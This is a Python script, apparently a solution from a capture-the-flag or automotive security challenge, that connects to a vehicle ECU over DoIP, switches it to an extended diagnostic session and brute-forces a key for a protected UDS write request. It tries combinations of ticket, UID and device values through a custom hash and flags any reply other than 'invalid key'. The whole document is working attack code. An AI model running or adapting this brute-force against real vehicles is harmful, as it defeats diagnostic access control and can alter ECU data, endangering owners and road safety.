import sys, json, base64, struct, hashlib, itertools; sys.path.insert(0,"04_SOLVE/uds")
from doip import DoIP
GOLD,m1,m2,k5=0x9E3779B9,0x7FEB352D,0x846CA68B,0xA5A5A5A5
def lb(x):
    x&=0xffffffff; x^=x>>16; x=(x*m1)&0xffffffff; x^=x>>15; x=(x*m2)&0xffffffff; x^=x>>16; return x&0xffffffff
def hash8(A,B,C):
    o=[]
    for i in range(2):
        a=struct.unpack("<I",A[4*i:4*i+4])[0]; b=struct.unpack("<I",B[4*i:4*i+4])[0]; c=struct.unpack("<I",C[4*i:4*i+4])[0]
        x=lb(a^b^c^(((i+1)*GOLD)&0xffffffff)); o.append((x+((i+1)*k5))&0xffffffff)
    return struct.pack("<II",*o)

C_DEV=bytes.fromhex("e224dd2bb23a15b8"); UID=bytes.fromhex("d31ad1cae3ffe1aedbf00f0d7fec3396")
tick=json.load(open("work/ticket_fresh.json"))
T=base64.urlsafe_b64decode(tick["diagnosticTicket"]+"="*(-len(tick["diagnosticTicket"])%4))
nonce,exp,tag=T[:16],T[16:24],T[24:]

W={
 "nonce0":nonce[:8],"nonce1":nonce[8:16],"exp":exp,"tag0":tag[:8],"tag1":tag[8:16],
 "uid0":UID[:8],"uid1":UID[8:16],"zero":b"\0"*8,"CDEV":C_DEV,
 "sha_nonce":hashlib.sha256(nonce).digest()[:8],"sha_tag":hashlib.sha256(tag).digest()[:8],
 "sha_ticket":hashlib.sha256(T).digest()[:8],
 "md5_ticket":hashlib.md5(T).digest()[:8],
}

d=DoIP(); d.connect(); d.routing_activation(); d.uds(0xE442,bytes.fromhex("1003"),wait=0.6)
found=[]
tested=0
# 1) hash8 全组合
for an,A in W.items():
    for bn,B in W.items():
        for cn,C in W.items():
            k=hash8(A,B,C); tested+=1
            x=d.parse_uds(d.uds(0xE442, bytes.fromhex("2EF1A1")+k, wait=0.35))
            u=x[0]['uds'] if x else "EMPTY"
            if u!="7f2e35":
                print(f" *** hash8({an},{bn},{cn}) = {k.hex()} -> {u}",flush=True); found.append((an,bn,cn,k.hex(),u))
print(f"hash8 combos tested={tested} found={len(found)}")
# 2) 直接值
for n,v in W.items():
    for vv in (v, v[::-1]):
        x=d.parse_uds(d.uds(0xE442, bytes.fromhex("2EF1A1")+vv, wait=0.35))
        u=x[0]['uds'] if x else "EMPTY"
        if u!="7f2e35":
            print(f" *** raw {n} {vv.hex()} -> {u}",flush=True); found.append((n,"","",vv.hex(),u))
print("total found:",len(found))
d.close()
